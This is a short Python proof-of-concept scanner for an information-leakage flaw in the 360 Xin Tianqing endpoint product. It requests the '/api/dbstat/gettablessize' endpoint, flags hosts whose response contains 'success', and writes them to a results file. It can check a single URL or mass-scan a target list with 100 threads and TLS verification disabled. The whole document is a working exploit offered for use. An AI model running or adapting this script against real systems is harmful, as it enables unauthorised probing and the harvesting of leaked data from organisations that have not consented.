import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    banner = '''   ____    __   ___    _        __        _            _    
 |___ \  / /  / _ \  (_)      / _|      | |          | |   
   __) |/ /_ | | | |  _ _ __ | |_ ___   | | ___  __ _| | __
  |__ <| '_ \| | | | | | '_ \|  _/ _ \  | |/ _ \/ _` | |/ /
  ___) | (_) | |_| | | | | | | || (_) | | |  __/ (_| |   < 
 |____/ \___/ \___/  |_|_| |_|_| \___/  |_|\___|\__,_|_|\_\
                                                           
                                                           

                                                      @version:1.0.1
                                                      @autor:guoguo12138
'''
    print(banner)
def poc(target):
    url = target+'/api/dbstat/gettablessize'
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://fofa.info",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Priority": "u=0, i",
        "Connection": "close",
    }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5).text
        if 'success' in res:
            print(f"[+] {target} 存在信息泄露漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} 信息泄露漏洞不存在")
    except:
        print(f"[*] {target} server error")
def main():
    banner()
    parser = argparse.ArgumentParser(description='this is a POC of 360新天擎 information leakage! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':
    main()